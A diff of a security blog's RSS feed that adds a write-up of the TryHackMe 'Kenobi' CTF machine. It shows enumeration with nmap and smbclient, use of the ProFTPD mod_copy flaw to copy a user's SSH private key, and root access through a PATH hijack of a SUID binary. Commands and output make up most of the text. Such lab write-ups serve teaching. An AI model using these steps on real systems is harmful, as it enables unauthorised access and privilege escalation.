@@ -1,4 +1,4 @@
-<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.12</generator><lastBuildDate>Tue, 07 Apr 2020 21:16:34 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>JockerCTF | write-up</title><description>&lt;p&gt;Hello world, I hope you are all well and safe home from the pandemic, today's challenge is a CTF by Tryhackme is rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/jockerctf-write-up/</link><guid isPermaLink="false">5e8caabb75832c27370ae6e1</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 07 Apr 2020 16:31:26 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/joker.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/joker.jpg" alt="JockerCTF | write-up"&gt;&lt;p&gt;Hello world, I hope you are all well and safe home from the pandemic, today's challenge is a CTF by Tryhackme is rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sV -sC 10.10.215.43 
+<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.12</generator><lastBuildDate>Wed, 08 Apr 2020 10:55:05 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>JockerCTF | write-up</title><description>&lt;p&gt;Hello world, I hope you are all well and safe home from the pandemic, today's challenge is a CTF by Tryhackme is rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/jockerctf-write-up/</link><guid isPermaLink="false">5e8caabb75832c27370ae6e1</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 07 Apr 2020 16:31:26 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/joker.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/joker.jpg" alt="JockerCTF | write-up"&gt;&lt;p&gt;Hello world, I hope you are all well and safe home from the pandemic, today's challenge is a CTF by Tryhackme is rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sV -sC 10.10.215.43 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 16:30 UTC
 Nmap scan report for ip-10-10-215-43.eu-west-1.compute.internal (10.10.215.43)
 Host is up (0.0010s latency).
@@ -182,7 +182,305 @@ root&lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="htt
 		/*! This file is auto-generated */
 		!function(d,l){"use strict";var e=!1,o=!1;if(l.querySelector)if(d.addEventListener)e=!0;if(d.wp=d.wp||{},!d.wp.receiveEmbedMessage)if(d.wp.receiveEmbedMessage=function(e){var t=e.data;if(t)if(t.secret||t.message||t.value)if(!/[^a-zA-Z0-9]/.test(t.secret)){var r,a,i,s,n,o=l.querySelectorAll('iframe[data-secret="'+t.secret+'"]'),c=l.querySelectorAll('blockquote[data-secret="'+t.secret+'"]');for(r=0;r&lt;c.length;r++)c[r].style.display="none";for(r=0;r&lt;o.length;r++)if(a=o[r],e.source===a.contentWindow){if(a.removeAttribute("style"),"height"===t.message){if(1e3&lt;(i=parseInt(t.value,10)))i=1e3;else if(~~i&lt;200)i=200;a.height=i}if("link"===t.message)if(s=l.createElement("a"),n=l.createElement("a"),s.href=a.getAttribute("src"),n.href=t.value,n.host===s.host)if(l.activeElement===a)d.top.location.href=t.value}}},e)d.addEventListener("message",d.wp.receiveEmbedMessage,!1),l.addEventListener("DOMContentLoaded",t,!1),d.addEventListener("load",t,!1);function t(){if(!o){o=!0;var e,t,r,a,i=-1!==navigator.appVersion.indexOf("MSIE 10"),s=!!navigator.userAgent.match(/Trident.*rv:11\./),n=l.querySelectorAll("iframe.wp-embedded-content");for(t=0;t&lt;n.length;t++){if(!(r=n[t]).getAttribute("data-secret"))a=Math.random().toString(36).substr(2,10),r.src+="#?secret="+a,r.setAttribute("data-secret",a);if(i||s)(e=r.cloneNode(!0)).removeAttribute("security"),r.parentNode.replaceChild(e,r)}}}}(window,document);
 //--&gt;&lt;!]]&gt;
-&lt;/script&gt;&lt;iframe sandbox="allow-scripts" security="restricted" src="https://www.hackingarticles.in/lxd-privilege-escalation/embed/" width="600" height="338" title="&amp;#8220;Lxd Privilege Escalation&amp;#8221; &amp;#8212; Hacking Articles" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"&gt;&lt;/iframe&gt;&lt;/figure&gt;</content:encoded></item><item><title>ToolsRus CTF | write-up</title><description>&lt;p&gt;Hello all, todays challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward.&lt;/p&gt;&lt;p&gt;Let's enumerate the machine&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.27.83
+&lt;/script&gt;&lt;iframe sandbox="allow-scripts" security="restricted" src="https://www.hackingarticles.in/lxd-privilege-escalation/embed/" width="600" height="338" title="&amp;#8220;Lxd Privilege Escalation&amp;#8221; &amp;#8212; Hacking Articles" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"&gt;&lt;/iframe&gt;&lt;/figure&gt;</content:encoded></item><item><title>Kenobi | CTF write-up</title><description>&lt;p&gt;This todays CTF we will cover a Kenobi made by www.tryhackme.com the theme of the machine is star-wars  ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9gISqB3tncMmY" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/cat-star-wars-9gISqB3tncMmY"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Let's enumerate this machine and see what we're dealing with&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.68.87
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:36&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/kenobi-ctf-write-up/</link><guid isPermaLink="false">5e8c661f75832c27370ae6ca</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 07 Apr 2020 11:40:35 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/Animated-GIF-downsized_large.gif" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/Animated-GIF-downsized_large.gif" alt="Kenobi | CTF write-up"&gt;&lt;p&gt;This todays CTF we will cover a Kenobi made by www.tryhackme.com the theme of the machine is star-wars  ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9gISqB3tncMmY" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/cat-star-wars-9gISqB3tncMmY"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Let's enumerate this machine and see what we're dealing with&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.68.87
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:36 UTC
+Nmap scan report for ip-10-10-68-87.eu-west-1.compute.internal (10.10.68.87)
+Host is up (0.00093s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.5
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
+|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
+|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/admin.html
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100003  2,3,4       2049/udp   nfs
+|   100003  2,3,4       2049/udp6  nfs
+|   100005  1,2,3      39562/udp6  mountd
+|   100005  1,2,3      44287/udp   mountd
+|   100005  1,2,3      57415/tcp6  mountd
+|   100005  1,2,3      58933/tcp   mountd
+|   100021  1,3,4      42750/udp6  nlockmgr
+|   100021  1,3,4      45283/tcp6  nlockmgr
+|   100021  1,3,4      45523/tcp   nlockmgr
+|   100021  1,3,4      55170/udp   nlockmgr
+|   100227  2,3         2049/tcp   nfs_acl
+|   100227  2,3         2049/tcp6  nfs_acl
+|   100227  2,3         2049/udp   nfs_acl
+|_  100227  2,3         2049/udp6  nfs_acl
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)          
+2049/tcp open  nfs_acl     2-3 (RPC #100227)
+MAC Address: 02:8A:BF:E2:69:EE (Unknown)
+Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel        
+Host script results:
+|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
+|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: kenobi
+|   NetBIOS computer name: KENOBI\x00
+|   Domain name: \x00
+|   FQDN: kenobi
+|_  System time: 2020-04-07T06:36:48-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-04-07T11:36:48
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-12.41.57.png" class="kg-image" alt="Kenobi | CTF write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-12.54.46.png" class="kg-image" alt="Kenobi | CTF write-up"&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/8McNH1aXZnVyE" width="480" height="258" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/its-a-trap-admiral-ackbar-8McNH1aXZnVyE"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# gobuster dir -u http://10.10.68.87/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.68.87/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/04/07 11:43:04 Starting gobuster
+===============================================================
+/server-status (Status: 403)
+===============================================================
+2020/04/07 11:43:22 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;after trying to fuzz for some directories, we didn't find anything so we will keep enumerating until we find something, I will enumerate SMB in case there's anything shared publicly &lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.68.87
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:45 UTC
+Nmap scan report for ip-10-10-68-87.eu-west-1.compute.internal (10.10.68.87)
+Host is up (0.00017s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 02:8A:BF:E2:69:EE (Unknown)
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.68.87\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
+|     Users: 1
+|     Max Users: &amp;lt;unlimited&amp;gt;
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.68.87\anonymous: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: &amp;lt;unlimited&amp;gt;
+|     Path: C:\home\kenobi\share
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.68.87\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: &amp;lt;unlimited&amp;gt;
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: &amp;lt;none&amp;gt;
+|_    Current user access: &amp;lt;none&amp;gt;
+|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.09 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# smbclient //10.10.68.87/anonymous
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \&amp;gt; dir
+  .                                   D        0  Wed Sep  4 10:49:09 2019
+  ..                                  D        0  Wed Sep  4 10:56:07 2019
+  log.txt                             N    12237  Wed Sep  4 10:49:09 2019
+                9204224 blocks of size 1024. 6855348 blocks available
+smb: \&amp;gt; &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Port 111 running the service &lt;strong&gt;rpcbind&lt;/strong&gt;. This is just an server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.&lt;/p&gt;&lt;p&gt;In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.68.87
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:54 UTC
+Nmap scan report for ip-10-10-68-87.eu-west-1.compute.internal (10.10.68.87)
+Host is up (0.00025s latency).
+
+PORT    STATE SERVICE
+111/tcp open  rpcbind
+| nfs-ls: Volume /var
+|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
+| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
+| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
+| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
+| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
+| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
+| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
+| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
+| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
+| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
+| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
+| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
+|_
+| nfs-showmount: 
+|_  /var *
+| nfs-statfs: 
+|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
+|_  /var        9204224.0  1858288.0  6855340.0  22%   16.0T        32000
+MAC Address: 02:8A:BF:E2:69:EE (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Use netcat to connect to the machine on the FTP port. We can use searchsploit to find exploits for a particular software version, &lt;strong&gt;Searchsploit&lt;/strong&gt; is basically just a command line search tool for exploit-db.com.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nc 10.10.68.87 21
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.87]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You ought to have discovered an exploit from ProFtpd's mod_copy module. The mod_copy module actualizes SITE CPFR and SITE CPTO commands, which can be utilized to copy files/directories from one place to another on the server. Any unauthenticated client can use these commands to duplicate documents from any piece of the filesystem to a chosen directory. We realize that the FTP administration is running as the Kenobi user (from the document on the share) and a ssh key is generated for that user.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# mkdir /mnt/kenobiNFS
+root@kali:~# mount 10.10.68.87:/var /mnt/kenobiNFS
+root@kali:~# cd /mnt/kenobiNFS/
+root@kali:/mnt/kenobiNFS# ls -la
+total 56
+drwxr-xr-x 14 root root    4096 Sep  4  2019 .
+drwxr-xr-x  3 root root    4096 Apr  7 12:00 ..
+drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
+drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
+drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
+drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
+drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
+lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -&amp;gt; /run/lock
+drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
+drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
+drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
+lrwxrwxrwx  1 root root       4 Sep  4  2019 run -&amp;gt; /run
+drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
+drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
+drwxrwxrwt  6 root root    4096 Apr  7 11:59 tmp
+drwxr-xr-x  3 root root    4096 Sep  4  2019 www
+root@kali:/mnt/kenobiNFS#&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# cp /mnt/kenobiNFS/tmp/id_rsa .
+root@kali:~# chmod 600 id_rsa 
+root@kali:~# ssh -i id_rsa kenobi@10.10.68.87
+The authenticity of host '10.10.68.87 (10.10.68.87)' can't be established.
+ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.68.87' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+103 packages can be updated.
+65 updates are security updates.
+
+
+Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
+To run a command as administrator (user "root"), use "sudo &amp;lt;command&amp;gt;".
+See "man sudo_root" for details.
+
+kenobi@kenobi:~$ &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and here we are ssh-ing to the kenobi user 😶&lt;/p&gt;&lt;pre&gt;&lt;code&gt;kenobi@kenobi:~$ ls -la
+total 40
+drwxr-xr-x 5 kenobi kenobi 4096 Sep  4  2019 .
+drwxr-xr-x 3 root   root   4096 Sep  4  2019 ..
+lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -&amp;gt; /dev/null
+-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
+-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
+drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
+-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
+drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
+drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
+-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
+-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
+kenobi@kenobi:~$ cat user.txt 
+xxxxxxxxxxxxxxxxxxxxxxxxxx224899
+kenobi@kenobi:~$ &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Time for some privilege escalation &lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/l4Ho9Eed9XDNQ94k0" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/animation-design-illustration-l4Ho9Eed9XDNQ94k0"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;kenobi@kenobi:~$ find / -type f -perm -u=s 2&amp;gt;/dev/null
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/menu
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/bin/umount
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+kenobi@kenobi:~$&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code class="language-markup"&gt;kenobi@kenobi:~$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :3
+eth0      Link encap:Ethernet  HWaddr 02:8a:bf:e2:69:ee  
+          inet addr:10.10.68.87  Bcast:10.10.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::8a:bfff:fee2:69ee/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
+          RX packets:266307 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:231976 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:35103632 (35.1 MB)  TX bytes:112553658 (112.5 MB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:190 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:190 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:14101 (14.1 KB)  TX bytes:14101 (14.1 KB)
+
+
+kenobi@kenobi:~$&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;kenobi@kenobi:/tmp$ echo /bin/bash &amp;gt; curl 
+kenobi@kenobi:/tmp$ chmod +x curl
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+To run a command as administrator (user "root"), use "sudo &amp;lt;command&amp;gt;".
+See "man sudo_root" for details.
+
+root@kenobi:/tmp# id
+uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+root@kenobi:/tmp# cat /root/
+.bash_history  .cache/        root.txt       
+.bashrc        .profile       .viminfo       
+root@kenobi:/tmp# cat /root/root.txt 
+**************************1f02
+root@kenobi:/tmp# 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;/usr/bin/menu runs as root it does curl server status and kernel version with uname or ifconfig, so i created a curl file and pushed to it a bin bash call gave it permission to be executable and exported the path were the file exists.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/sQL9UPichyoFO" width="480" height="252" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/reaction-sQL9UPichyoFO"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>ToolsRus CTF | write-up</title><description>&lt;p&gt;Hello all, todays challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward.&lt;/p&gt;&lt;p&gt;Let's enumerate the machine&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.27.83
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC
 Nmap scan report for ip-10-10-27-83.eu-west-1.&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/toolsrus-ctf-write-up/</link><guid isPermaLink="false">5e873c54c0200b446da05df8</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 03 Apr 2020 13:44:52 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg" alt="ToolsRus CTF | write-up"&gt;&lt;p&gt;Hello all, todays challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward.&lt;/p&gt;&lt;p&gt;Let's enumerate the machine&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.27.83
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC
